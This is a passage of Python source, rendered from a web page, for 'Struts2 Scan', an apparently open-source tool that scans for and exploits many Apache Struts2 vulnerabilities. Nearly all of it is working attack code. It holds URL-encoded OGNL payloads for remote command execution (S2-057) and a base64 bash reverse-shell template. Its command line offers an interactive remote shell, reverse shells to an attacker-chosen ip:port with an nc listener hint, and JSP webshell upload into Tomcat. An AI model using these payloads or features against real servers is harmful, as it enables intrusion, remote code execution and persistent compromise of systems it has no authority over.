æ”¯æŒä»»æ„å‘½ä»¤æ‰§è¡Œå’Œåå¼¹shell&quot;</span><br><span class="line">    check_poc = &quot;%24%7BNUM1%2BNUM2%7D&quot;</span><br><span class="line">    exec_payload1 = &quot;%24%7B%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D@java.lang.Runtime@getRuntime%28%29.exec%28%27&#123;cmd&#125;%27%29.getInputStream%28%29%2C%23b%3Dnew%20java.io.InputStreamReader%28%23a%29%2C%23c%3Dnew%20%20java.io.BufferedReader%28%23b%29%2C%23d%3Dnew%20char%5B51020%5D%2C%23c.read%28%23d%29%2C%23sbtest%3D@org.apache.struts2.ServletActionContext@getResponse%28%29.getWriter%28%29%2C%23sbtest.println%28%23d%29%2C%23sbtest.close%28%29%29%7D&quot;</span><br><span class="line">    exec_payload2 = &quot;%24%7B%28%23_memberAccess%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23w%3D%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.print%28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27&#123;cmd&#125;%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D&quot;</span><br><span class="line">    exec_payload3 = &quot;%24%7B%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23w%3D%23ct.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.print%28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27&#123;cmd&#125;%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D&quot;</span><br><span class="line">    exec_payload4 = &quot;%24%7B%0A%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23a%3D@java.lang.Runtime@getRuntime%28%29.exec%28%27&#123;cmd&#125;%27%29%29.%28@org.apache.commons.io.IOUtils@toString%28%23a.getInputStream%28%29%29%29%7D&quot;</span><br><span class="line">    shell = &quot;bash -c &#123;echo,SHELL&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br><span class="line"> </span><br><span class="line">    def __init__(self, url, data=None, headers=None, encoding=&quot;UTF-8&quot;):</span><br><span class="line">        if url.endswith(&quot;.action&quot;):</span><br><span class="line">            rindex = url.rindex(&#x27;/&#x27;)</span><br><span class="line">            self.url = url[:rindex + 1]</span><br><span class="line">            self.name = url[rindex + 1:]</span><br><span class="line">        elif url.endswith(&quot;/&quot;):</span><br><span class="line">            self.url = url</span><br><span class="line">            self.name = &quot;index.action&quot;</span><br><span class="line">        else:</span><br><span class="line">            self.url = url + &#x27;/&#x27;</span><br><span class="line">            self.name = &quot;index.action&quot;</span><br><span class="line">        self.headers = parse_headers(headers)</span><br><span class="line">        self.encoding = encoding</span><br><span class="line">        self.is_vul = False</span><br><span class="line"> </span><br><span class="line">    def check(self):</span><br><span class="line">        &quot;&quot;&quot;æ£€æµ‹æ¼æ´æ˜¯å¦å­˜åœ¨&quot;&quot;&quot;</span><br><span class="line">        num1 = random.randint(10000, 100000)</span><br><span class="line">        num2 = random.randint(10000, 100000)</span><br><span class="line">        poc = self.check_poc.replace(&quot;NUM1&quot;, str(num1)).replace(&quot;NUM2&quot;, str(num2))</span><br><span class="line">        url = self.url + poc + &quot;/&quot; + self.name</span><br><span class="line">        html = get_302(url, self.headers, self.encoding)</span><br><span class="line">        if str(html).startswith(&quot;ERROR:&quot;):</span><br><span class="line">            return html</span><br><span class="line">        if str(num1 + num2) in html:</span><br><span class="line">            self.is_vul = True</span><br><span class="line">            return &#x27;S2-057&#x27;</span><br><span class="line">        return self.is_vul</span><br><span class="line"> </span><br><span class="line">    def choice_exp(self):</span><br><span class="line">        &quot;&quot;&quot;é€‰æ‹©å¯ç”¨çš„exp&quot;&quot;&quot;</span><br><span class="line">        payloads = [self.exec_payload1, self.exec_payload2, self.exec_payload3, self.exec_payload4]</span><br><span class="line">        hash_str = get_hash()</span><br><span class="line">        for exp in payloads:</span><br><span class="line">            payload = exp.format(cmd=quote(&quot;echo &quot; + hash_str))</span><br><span class="line">            url = self.url + payload + &quot;/&quot; + self.name</span><br><span class="line">            html = get_302(url, self.headers, self.encoding)</span><br><span class="line">            if hash_str in html:</span><br><span class="line">                return exp</span><br><span class="line">        return &quot;ERROR: æ— å¯ç”¨Payload!&quot;</span><br><span class="line"> </span><br><span class="line">    def exec_cmd(self, cmd):</span><br><span class="line">        &quot;&quot;&quot;æ‰§è¡Œå‘½ä»¤&quot;&quot;&quot;</span><br><span class="line">        exp = self.choice_exp()</span><br><span class="line">        if exp.startswith(&#x27;ERROR:&#x27;):</span><br><span class="line">            return exp</span><br><span class="line"> </span><br><span class="line">        payload = exp.format(cmd=quote(cmd))</span><br><span class="line">        url = self.url + payload + &quot;/&quot; + self.name</span><br><span class="line">        html = get_302(url, self.headers, self.encoding)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line">    def reverse_shell(self, ip, port):</span><br><span class="line">        &quot;&quot;&quot;åå¼¹shell&quot;&quot;&quot;</span><br><span class="line">        html = reverse_shell(self, ip, port)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"># æ‰€æœ‰æ¼æ´åç§°</span><br><span class="line">s2_dict = &#123;&#x27;S2_001&#x27;: S2_001, &#x27;S2_003&#x27;: S2_003, &#x27;S2_005&#x27;: S2_005, &#x27;S2_007&#x27;: S2_007, &#x27;S2_008&#x27;: S2_008, &#x27;S2_009&#x27;: S2_009,</span><br><span class="line">           &#x27;S2_012&#x27;: S2_012, &#x27;S2_013&#x27;: S2_013, &#x27;S2_015&#x27;: S2_015, &#x27;S2_016&#x27;: S2_016, &#x27;S2_019&#x27;: S2_019, &#x27;S2_029&#x27;: S2_029,</span><br><span class="line">           &#x27;S2_032&#x27;: S2_032, &#x27;S2_033&#x27;: S2_033, &#x27;S2_037&#x27;: S2_037, &#x27;S2_045&#x27;: S2_045, &#x27;S2_046&#x27;: S2_046, &#x27;S2_048&#x27;: S2_048,</span><br><span class="line">           &#x27;S2_052&#x27;: S2_052, &#x27;S2_053&#x27;: S2_053, &#x27;S2_devMode&#x27;: S2_devMode, &quot;S2_057&quot;: S2_057&#125;</span><br><span class="line"># S2-052ä¸æ”¯æŒæ¼æ´æ‰«æå’Œæ£€æŸ¥</span><br><span class="line">s2_list1 = [S2_001, S2_003, S2_005, S2_007, S2_008, S2_009, S2_012, S2_013, S2_015, S2_016, S2_019,</span><br><span class="line">           S2_029, S2_032, S2_033, S2_037, S2_045, S2_046, S2_048, S2_053, S2_devMode, S2_057]</span><br><span class="line">s2_list = [&#x27;S2_001&#x27;, &#x27;S2_003&#x27;, &#x27;S2_005&#x27;, &#x27;S2_007&#x27;, &#x27;S2_008&#x27;, &#x27;S2_009&#x27;, &#x27;S2_012&#x27;, &#x27;S2_013&#x27;, &#x27;S2_015&#x27;, &#x27;S2_016&#x27;, &#x27;S2_019&#x27;,</span><br><span class="line">           &#x27;S2_029&#x27;, &#x27;S2_032&#x27;, &#x27;S2_033&#x27;, &#x27;S2_037&#x27;, &#x27;S2_045&#x27;, &#x27;S2_046&#x27;, &#x27;S2_048&#x27;, &#x27;S2_053&#x27;, &#x27;S2_devMode&#x27;, &#x27;S2_057&#x27;]</span><br><span class="line"> </span><br><span class="line"># æ”¯æŒè·å–WEBè·¯å¾„çš„æ¼æ´åç§°åˆ—è¡¨</span><br><span class="line">webpath_names = [&quot;S2_001&quot;, &quot;S2_005&quot;, &quot;S2_013&quot;, &quot;S2_016&quot;, &quot;S2_019&quot;, &quot;S2_032&quot;, &quot;S2_037&quot;, &quot;S2_045&quot;, &quot;S2_046&quot;, &quot;S2_devMode&quot;]</span><br><span class="line"># æ”¯æŒå‘½ä»¤æ‰§è¡Œçš„æ¼æ´åç§°åˆ—è¡¨</span><br><span class="line">exec_names = [&quot;S2_001&quot;, &quot;S2_003&quot;, &quot;S2_005&quot;, &quot;S2_007&quot;, &quot;S2_008&quot;, &quot;S2_009&quot;, &quot;S2_013&quot;, &quot;S2_015&quot;, &quot;S2_016&quot;, &quot;S2_019&quot;,</span><br><span class="line">              &quot;S2_029&quot;, &quot;S2_032&quot;, &quot;S2_033&quot;, &quot;S2_037&quot;, &quot;S2_045&quot;, &quot;S2_046&quot;, &quot;S2_048&quot;, &quot;S2_052&quot;, &quot;S2_053&quot;, &quot;S2_devMode&quot;,</span><br><span class="line">              &quot;S2_057&quot;]</span><br><span class="line"># æ”¯æŒåå¼¹shellçš„æ¼æ´åç§°åˆ—è¡¨</span><br><span class="line">reverse_names = [&quot;S2_001&quot;, &quot;S2_007&quot;, &quot;S2_008&quot;, &quot;S2_009&quot;, &quot;S2_013&quot;, &quot;S2_015&quot;, &quot;S2_016&quot;, &quot;S2_019&quot;, &quot;S2_029&quot;, &quot;S2_032&quot;,</span><br><span class="line">                 &quot;S2_033&quot;, &quot;S2_037&quot;, &quot;S2_045&quot;, &quot;S2_046&quot;, &quot;S2_048&quot;, &quot;S2_052&quot;, &quot;S2_053&quot;, &quot;S2_devMode&quot;, &quot;S2_057&quot;]</span><br><span class="line"># æ”¯æŒæ–‡ä»¶ä¸Šä¼ çš„æ¼æ´åç§°åˆ—è¡¨</span><br><span class="line">upload_names = [&quot;S2_013&quot;, &quot;S2_016&quot;, &quot;S2_019&quot;, &quot;S2_045&quot;, &quot;S2_046&quot;]</span><br><span class="line"> </span><br><span class="line">banner = &quot;&quot;&quot;</span><br><span class="line"> ____  _              _       ____    ____                  </span><br><span class="line">/ ___|| |_ _ __ _   _| |_ ___|___ \  / ___|  ___ __ _ _ __  </span><br><span class="line">\___ \| __| &#x27;__| | | | __/ __| __) | \___ \ / __/ _` | &#x27;_ \ </span><br><span class="line"> ___) | |_| |  | |_| | |_\__ \/ __/   ___) | (_| (_| | | | |</span><br><span class="line">|____/ \__|_|   \__,_|\__|___/_____| |____/ \___\__,_|_| |_|</span><br><span class="line"> </span><br><span class="line">                                      Author By HatBoy        </span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def show_info():</span><br><span class="line">    &quot;&quot;&quot;æ¼æ´è¯¦æƒ…ä»‹ç»&quot;&quot;&quot;</span><br><span class="line">    click.secho(&quot;[+] æ”¯æŒå¦‚ä¸‹Struts2æ¼æ´:&quot;, fg=&#x27;red&#x27;)</span><br><span class="line">    for k, v in s2_dict.items():</span><br><span class="line">        click.secho(v.info, fg=&#x27;green&#x27;)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def check_one(s):</span><br><span class="line">    &quot;&quot;&quot;æ£€æµ‹å•ä¸ªæ¼æ´&quot;&quot;&quot;</span><br><span class="line">    result = s.check()</span><br><span class="line">    return result</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def scan_one(url, data=None, headers=None, encoding=&quot;UTF-8&quot;):</span><br><span class="line">    &quot;&quot;&quot;æ‰«æå•ä¸ªURLæ¼æ´&quot;&quot;&quot;</span><br><span class="line">    click.secho(&#x27;[+] æ­£åœ¨æ‰«æURL:&#x27; + url, fg=&#x27;green&#x27;)</span><br><span class="line">    ss = [s(url, data, headers, encoding) for s in s2_list1]</span><br><span class="line">    with futures.ThreadPoolExecutor(max_workers=10) as executor:</span><br><span class="line">        results = list(executor.map(check_one, ss))</span><br><span class="line">    results = &#123;r for r in results if r&#125;</span><br><span class="line">    click.secho(&#x27;[*] ----------------results------------------&#x27;.format(url=url), fg=&#x27;green&#x27;)</span><br><span class="line">    if (not results) and (not is_quiet):</span><br><span class="line">        click.secho(&#x27;[*] &#123;url&#125; æœªå‘ç°æ¼æ´&#x27;.format(url=url), fg=&#x27;red&#x27;)</span><br><span class="line">    for r in results:</span><br><span class="line">        if r.startswith(&quot;ERROR:&quot;):</span><br><span class="line">            click.secho(&#x27;[ERROR] &#123;url&#125; è®¿é—®å‡ºé”™: &#123;error&#125;&#x27;.format(url=url, error=r[6:]), fg=&#x27;red&#x27;)</span><br><span class="line">        else:</span><br><span class="line">            click.secho(&#x27;[*] &#123;url&#125; å­˜åœ¨æ¼æ´: &#123;name&#125;&#x27;.format(url=url, name=r), fg=&#x27;red&#x27;)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def scan_more(urls, data=None, headers=None, encoding=&quot;UTF-8&quot;):</span><br><span class="line">    &quot;&quot;&quot;æ‰¹é‡æ‰«æURL&quot;&quot;&quot;</span><br><span class="line">    scan = partial(scan_one, data=data, headers=headers, encoding=encoding)</span><br><span class="line">    with futures.ProcessPoolExecutor(max_workers=process) as executor:</span><br><span class="line">        results = list(executor.map(scan, urls))</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">CONTEXT_SETTINGS = dict(help_option_names=[&#x27;-h&#x27;, &#x27;--help&#x27;])</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">@click.command(context_settings=CONTEXT_SETTINGS)</span><br><span class="line">@click.option(&#x27;-i&#x27;, &#x27;--info&#x27;, is_flag=True, help=&quot;æ¼æ´ä¿¡æ¯ä»‹ç»&quot;)</span><br><span class="line">@click.option(&#x27;-v&#x27;, &#x27;--version&#x27;, is_flag=True, help=&quot;æ˜¾ç¤ºå·¥å…·ç‰ˆæœ¬&quot;)</span><br><span class="line">@click.option(&#x27;-u&#x27;, &#x27;--url&#x27;, help=&quot;URLåœ°å€&quot;)</span><br><span class="line">@click.option(&#x27;-n&#x27;, &#x27;--name&#x27;, help=&quot;æŒ‡å®šæ¼æ´åç§°, æ¼æ´åç§°è¯¦è§info&quot;)</span><br><span class="line">@click.option(&#x27;-f&#x27;, &#x27;--file&#x27;, help=&quot;æ‰¹é‡æ‰«æURLæ–‡ä»¶, ä¸€è¡Œä¸€ä¸ªURL&quot;)</span><br><span class="line">@click.option(&#x27;-d&#x27;, &#x27;--data&#x27;, help=&quot;POSTå‚æ•°, éœ€è¦ä½¿ç”¨çš„payloadä½¿ç”¨&#123;exp&#125;å¡«å……, å¦‚: name=test&amp;passwd=&#123;exp&#125;&quot;)</span><br><span class="line">@click.option(&#x27;-c&#x27;, &#x27;--encode&#x27;, default=&quot;UTF-8&quot;, help=&quot;é¡µé¢ç¼–ç , é»˜è®¤UTF-8ç¼–ç &quot;)</span><br><span class="line">@click.option(&#x27;-p&#x27;, &#x27;--proxy&#x27;, help=&quot;HTTPä»£ç†. æ ¼å¼ä¸ºhttp://ip:port&quot;)</span><br><span class="line">@click.option(&#x27;-t&#x27;, &#x27;--timeout&#x27;, help=&quot;HTTPè¶…æ—¶æ—¶é—´, é»˜è®¤10s&quot;)</span><br><span class="line">@click.option(&#x27;-w&#x27;, &#x27;--workers&#x27;, help=&quot;æ‰¹é‡æ‰«æè¿›ç¨‹æ•°, é»˜è®¤ä¸º10ä¸ªè¿›ç¨‹&quot;)</span><br><span class="line">@click.option(&#x27;--header&#x27;, help=&quot;HTTPè¯·æ±‚å¤´, æ ¼å¼ä¸º: key1=value1&amp;key2=value2&quot;)</span><br><span class="line">@click.option(&#x27;-e&#x27;, &#x27;--exec&#x27;, is_flag=True, help=&quot;è¿›å…¥å‘½ä»¤æ‰§è¡Œshell&quot;)</span><br><span class="line">@click.option(&#x27;--webpath&#x27;, is_flag=True, help=&quot;è·å–WEBè·¯å¾„&quot;)</span><br><span class="line">@click.option(&#x27;-r&#x27;, &#x27;--reverse&#x27;, help=&quot;åå¼¹shellåœ°å€, æ ¼å¼ä¸ºip:port&quot;)</span><br><span class="line">@click.option(&#x27;--upfile&#x27;, help=&quot;éœ€è¦ä¸Šä¼ çš„æ–‡ä»¶è·¯å¾„å’Œåç§°&quot;)</span><br><span class="line">@click.option(&#x27;--uppath&#x27;, help=&quot;ä¸Šä¼ çš„ç›®å½•å’Œåç§°, å¦‚: /usr/local/tomcat/webapps/ROOT/shell.jsp&quot;)</span><br><span class="line">@click.option(&#x27;-q&#x27;, &#x27;--quiet&#x27;, is_flag=True, help=&quot;å…³é—­æ‰“å°ä¸å­˜åœ¨æ¼æ´çš„è¾“å‡ºï¼Œåªä¿ç•™å­˜åœ¨æ¼æ´çš„è¾“å‡º&quot;)</span><br><span class="line">def main(info, version, url, file, name, data, header, encode, proxy, exec, reverse, upfile, uppath, quiet, timeout,</span><br><span class="line">         workers, webpath):</span><br><span class="line">    &quot;&quot;&quot;Struts2æ‰¹é‡æ‰«æåˆ©ç”¨å·¥å…·&quot;&quot;&quot;</span><br><span class="line">    global proxies, is_quiet, _tiemout, process</span><br><span class="line">    click.secho(banner, fg=&#x27;red&#x27;)</span><br><span class="line">    if not encode:</span><br><span class="line">        encode = &#x27;UTF-8&#x27;</span><br><span class="line">    if info:</span><br><span class="line">        show_info()</span><br><span class="line">        exit(0)</span><br><span class="line">    if version:</span><br><span class="line">        click.secho(&quot;[+] Struts2 Scan V0.1&quot;, fg=&#x27;green&#x27;)</span><br><span class="line">        exit(0)</span><br><span class="line">    if proxy:</span><br><span class="line">        proxies = &#123;</span><br><span class="line">            &quot;http&quot;: proxy,</span><br><span class="line">            &quot;https&quot;: proxy</span><br><span class="line">        &#125;</span><br><span class="line">    if quiet:</span><br><span class="line">        is_quiet = True</span><br><span class="line">    if timeout and check_int(&#x27;timeout&#x27;, timeout):</span><br><span class="line">        _tiemout = check_int(&#x27;timeout&#x27;, timeout)</span><br><span class="line">    if workers and check_int(&#x27;workers&#x27;, workers):</span><br><span class="line">        process = check_int(&#x27;workers&#x27;, workers)</span><br><span class="line">    if url and not name:</span><br><span class="line">        scan_one(url, data, header, encode)</span><br><span class="line">    if file:</span><br><span class="line">        urls = read_urls(file)</span><br><span class="line">        scan_more(urls, data, header, encode)</span><br><span class="line">    if name and url:</span><br><span class="line">        # æŒ‡å®šæ¼æ´åˆ©ç”¨</span><br><span class="line">        name = name.upper().replace(&#x27;-&#x27;, &#x27;_&#x27;)</span><br><span class="line">        if name not in s2_list:</span><br><span class="line">            click.secho(&quot;[ERROR] æš‚ä¸æ”¯æŒ&#123;name&#125;æ¼æ´åˆ©ç”¨&quot;.format(name=name), fg=&quot;red&quot;)</span><br><span class="line">            exit(0)</span><br><span class="line">        s = s2_dict[name](url, data, header, encode)</span><br><span class="line">        s.check()</span><br><span class="line">        if not s.is_vul:</span><br><span class="line">            click.secho(&quot;[ERROR] è¯¥URLä¸å­˜åœ¨&#123;name&#125;æ¼æ´&quot;.format(name=name), fg=&quot;red&quot;)</span><br><span class="line">        if webpath:</span><br><span class="line">            if name in webpath_names:</span><br><span class="line">                web_path = s.get_path()</span><br><span class="line">                click.secho(&quot;[*] &#123;webpath&#125;&quot;.format(webpath=web_path), fg=&quot;red&quot;)</span><br><span class="line">                exit(0)</span><br><span class="line">            else:</span><br><span class="line">                click.secho(&quot;[ERROR] æ¼æ´&#123;name&#125;ä¸æ”¯æŒè·å–WEBè·¯å¾„&quot;.format(name=name), fg=&quot;red&quot;)</span><br><span class="line">                exit(0)</span><br><span class="line">        if reverse:</span><br><span class="line">            if name in reverse_names:</span><br><span class="line">                click.secho(&quot;[*] è¯·åœ¨åå¼¹åœ°å€å¤„ç›‘å¬ç«¯å£å¦‚: nc -lvvp 8080&quot;, fg=&quot;red&quot;)</span><br><span class="line">                if &#x27;:&#x27; not in reverse:</span><br><span class="line">                    click.secho(&quot;[ERROR] reverseåå¼¹åœ°å€æ ¼å¼ä¸å¯¹,æ­£ç¡®æ ¼å¼ä¸º: 192.168.1.10:8080&quot;, fg=&quot;red&quot;)</span><br><span class="line">                ip = reverse.split(&#x27;:&#x27;)[0].strip()</span><br><span class="line">                port = reverse.split(&#x27;:&#x27;)[1].strip()</span><br><span class="line">                s.reverse_shell(ip, port)</span><br><span class="line">                exit(0)</span><br><span class="line">            else:</span><br><span class="line">                click.secho(&quot;[ERROR] æ¼æ´&#123;name&#125;ä¸æ”¯æŒåå¼¹shell&quot;.format(name=name), fg=&quot;red&quot;)</span><br><span class="line">                exit(0)</span><br><span class="line">        if upfile and uppath:</span><br><span class="line">            if name in upload_names and check_file(upfile):</span><br><span class="line">                result = s.upload_shell(uppath, upfile)</span><br><span class="line">                if result is True:</span><br><span class="line">                    click.secho(&quot;[+] æ–‡ä»¶ä¸Šä¼ æˆåŠŸ!&quot;, fg=&quot;green&quot;)</span><br><span class="line">                    exit(0)</span><br><span class="line">                elif str(result).startswith(&quot;ERROR:&quot;):</span><br><span class="line">                    click.secho(&quot;[ERROR] æ–‡ä»¶ä¸Šä¼ å¤±è´¥! &#123;error&#125;&quot;.format(error=result[6:]), fg=&quot;red&quot;)</span><br><span class="line">                    exit(0)</span><br><span class="line">                else:</span><br><span class="line">                    click.secho(&quot;[ERROR] æ–‡ä»¶ä¸Šä¼ å¤±è´¥! \n&#123;error&#125;&quot;.format(error=result), fg=&quot;red&quot;)</span><br><span class="line">                    exit(0)</span><br><span class="line">            else:</span><br><span class="line">                click.secho(&quot;[ERROR] æ¼æ´&#123;name&#125;ä¸æ”¯æŒæ–‡ä»¶ä¸Šä¼ &quot;.format(name=name), fg=&quot;red&quot;)</span><br><span class="line">                exit(0)</span><br><span class="line">        if exec:</span><br><span class="line">            if name in exec_names:</span><br><span class="line">                if name == &quot;S2_052&quot;:</span><br><span class="line">                    click.secho(&quot;[+] æç¤º: S2_052å‘½ä»¤æ‰§è¡Œæ— å›æ˜¾ï¼Œå¯å°†ç»“æœå†™å…¥æ–‡ä»¶è®¿é—®&quot;, fg=&#x27;red&#x27;)</span><br><span class="line">                while True:</span><br><span class="line">                    cmd = input(&#x27;&gt;&gt;&gt;&#x27;)</span><br><span class="line">                    result = s.exec_cmd(cmd)</span><br><span class="line">                    click.secho(result, fg=&#x27;red&#x27;)</span><br><span class="line">            else:</span><br><span class="line">                click.secho(&quot;[ERROR] æ¼æ´&#123;name&#125;ä¸æ”¯æŒå‘½ä»¤æ‰§è¡Œ&quot;.format(name=name), fg=&quot;red&quot;)</span><br><span class="line">                exit(0)</span><br><span class="line">        click.secho(s.info, fg=&#x27;green&#x27;)</span><br><span class="line">        exit(0)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    try:</span><br><span class="line">        main()</span><br><span class="line">    except KeyboardInterrupt as e:</span><br><span class="line">        exit(0)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        click.secho(&quot;[ERROR] &#123;error&#125;&quot;.format(error=e), fg=&#x27;red&#x27;)</span><br><span class="line">        exit(0)</span><br><span class="line"> </span><br><span class="line"># s = S2_001(&quot;http://192.168.100.8:8080/login.action&quot;)</span><br><span class="line"># print(s.info)</span><br><span class="line"># print(s.check())</span><br><span class="line"># print(s.get_path())</span><br><span class="line"># print(s.exec_cmd(&#x27;ls -al&#x27;))</span><br><span class="line"># s.reverse_shell(&#x27;192.168.100.8&#x27;, &#x27;8888&#x27;)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"># s =  S2_003(&quot;http://192.168.100.8:8080/showcase.action&quot;)</span><br><span class="line"># print(s.check())</span><br><span class="line"># print(s.exec_cmd(&#x27;ls -la&#x27;))</span><br><span class="line"> </span><br><span class="line"># s = S2_005(&quot;http://192.168.100.8:8080/example/HelloWorld.action&quot;)</span><br><span class="line"># print(s.check())</span><br><span class="line"># print(s.get_path())</span><br><span class="line"># print(s.exec_cmd(&#x27;ls -al&#x27;))</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"># s = S2_007(&quot;http://192.168.100.8:8080/user.action&quot;, &quot;name=admin&amp;email=admin&amp;age=&#123;exp&#125;&quot;)</span><br><span class="line"># s.check()</span><br><span class="line"># print(s.exec_cmd(&#x27;ls -la&#x27;))</span><br><span class="line"># s.reverse_shell(&#x27;192.168.100.8&#x27;, &#x27;8888&#x27;)</span><br><span class="line"> </span><br><span class="line"># s = S2_008(&quot;http://192.168.100.8:8080&quot;)</span><br><span class="line"># s.check()</span><br><span class="line"># print(s.exec_cmd(&#x27;ls -la&#x27;))</span><br><span class="line"># s.reverse_shell(&#x27;192.168.100.8&#x27;, &#x27;8888&#x27;)</span><br><span class="line"> </span><br><span class="line"># s = S2_009(&quot;http://192.168.100.8:8080/ajax/example5.action?age=123&quot;, &quot;name&quot;)</span><br><span class="line"># s.check()</span><br><span class="line"># print(s.exec_cmd(&#x27;ls -la&#x27;))</span><br><span class="line"># s.reverse_shell(&#x27;192.168.100.8&#x27;, &#x27;8888&#x27;)</span><br><span class="line"> </span><br><span class="line"># s = S2_012(&quot;http://192.168.100.8:8080/S2-012/user.action?name=&quot;)</span><br><span class="line"># s.check()</span><br><span class="line"># print(s.exec_cmd(&#x27;ls -la&#x27;))</span><br><span class="line"># s.reverse_shell(&#x27;192.168.100.8&#x27;, &#x27;8888&#x27;)</span><br><span class="line"> </span><br><span class="line"># s = S2_013(&quot;http://192.168.100.8:8080/S2-013/link.action&quot;)</span><br><span class="line"># s.check()</span><br><span class="line"># print(s.get_path())</span><br><span class="line"># print(s.exec_cmd(&#x27;ls -la&#x27;))</span><br><span class="line"># s.reverse_shell(&#x27;192.168.100.8&#x27;, &#x27;8888&#x27;)</span><br><span class="line"># print(s.upload_shell(&#x27;/usr/local/tomcat/webapps/ROOT/shell.jsp&#x27;, &#x27;shell.jsp&#x27;))</span><br><span class="line"> </span><br><span class="line"># s = S2_015(&quot;http://192.168.100.8:8080/param.action&quot;)</span><br><span class="line"># s.check()</span><br><span class="line"># print(s.exec_cmd(&#x27;ls -la&#x27;))</span><br><span class="line"># s.reverse_shell(&#x27;192.168.100.8&#x27;, &#x27;8888&#x27;)</span><br><span class="line"> </span><br><span class="line"># s = S2_016(&quot;http://192.168.100.8:8080/index.action&quot;)</span><br><span class="line"># s.check()</span><br><span class="line"># print(s.get_path())</span><br><span class="line"># print(s.exec_cmd(&#x27;ls -la&#x27;))</span><br><span class="line"># s.reverse_shell(&#x27;192.168.100.8&#x27;, &#x27;8888&#x27;)</span><br><span class="line"># print(s.exec_cmd1(&#x27;ls -la&#x27;))</span><br><span class="line"># print(&#x27;---------------------&#x27;)</span><br><span class="line"># print(s.exec_cmd2(&#x27;ls -la&#x27;))</span><br><span class="line"># print(&#x27;---------------------&#x27;)</span><br><span class="line"># print(s.exec_cmd3(&#x27;ls -la&#x27;))</span><br><span class="line"># print(s.upload_shell1(&#x27;/usr/local/tomcat/webapps/ROOT/shell.jsp&#x27;, &#x27;shell.jsp&#x27;))</span><br><span class="line"># print(s.upload_shell(&#x27;/usr/local/tomcat/webapps/ROOT/shell.jsp&#x27;, &#x27;shell.jsp&#x27;))</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"># s = S2_019(&quot;http://192.168.100.8:8080/example/HelloWorld.action&quot;)</span><br><span class="line"># print(s.get_path())</span><br><span class="line"># s.check()</span><br><span class="line"># print(s.exec_cmd(&#x27;ls -la&#x27;))</span><br><span class="line"># s.reverse_shell(&#x27;192.168.100.8&#x27;, &#x27;8888&#x27;)</span><br><span class="line"># print(s.upload_shell(&#x27;/usr/local/tomcat/webapps/ROOT/shell.jsp&#x27;, &#x27;shell.jsp&#x27;))</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"># s = S2_029(&quot;http://192.168.100.8/default.action&quot;)</span><br><span class="line"># s.check()</span><br><span class="line"># print(s.exec_cmd(&#x27;ls -la&#x27;))</span><br><span class="line"># s.reverse_shell(&#x27;192.168.100.8&#x27;, &#x27;8888&#x27;)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"># s = S2_032(&quot;http://192.168.100.8:8080/index.action&quot;)</span><br><span class="line"># s.check()</span><br><span class="line"># print(s.exec_cmd(&#x27;ls -la&#x27;))</span><br><span class="line"># print(s.get_path())</span><br><span class="line"># s.reverse_shell(&#x27;192.168.100.8&#x27;, &#x27;8888&#x27;)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"># s = S2_033(&quot;http://192.168.100.8/orders/3&quot;)</span><br><span class="line"># s.check()</span><br><span class="line"># print(s.exec_cmd(&#x27;ls -la&#x27;))</span><br><span class="line"># s.reverse_shell(&#x27;192.168.100.8&#x27;, &#x27;8888&#x27;)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"># s = S2_037(&quot;http://192.168.100.8:8080/orders/3/&quot;)</span><br><span class="line"># s.check()</span><br><span class="line"># print(s.exec_cmd(&#x27;ls -la&#x27;))</span><br><span class="line"># print(s.get_path())</span><br><span class="line"># s.reverse_shell(&#x27;192.168.100.8&#x27;, &#x27;8888&#x27;)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"># s = S2_045(&quot;http://192.168.100.8/memoshow.action&quot;)</span><br><span class="line"># s.check()</span><br><span class="line"># print(s.get_path())</span><br><span class="line"># print(s.exec_cmd(&#x27;ls 